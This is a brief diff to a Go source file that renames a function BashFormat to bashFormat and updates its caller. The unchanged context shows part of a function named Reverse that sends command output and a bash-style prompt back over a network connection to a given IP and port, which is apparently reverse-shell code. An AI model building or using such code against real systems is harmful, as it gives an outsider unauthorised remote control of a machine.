@@ -11,7 +11,7 @@ import (
   "log"
 )
 
-func BashFormat() string {
+func bashFormat() string {
   u, e := user.Current()
   if e != nil {
     log.Fatal(e)
@@ -39,7 +39,7 @@ func Reverse(ip string, port string){
       fmt.Fprintf(conn, "%s\n", err)
     }
 
-    format := BashFormat()
+    format := bashFormat()
     fmt.Fprintf(conn, "%s\n%v$ ", out, format)
   }
 }
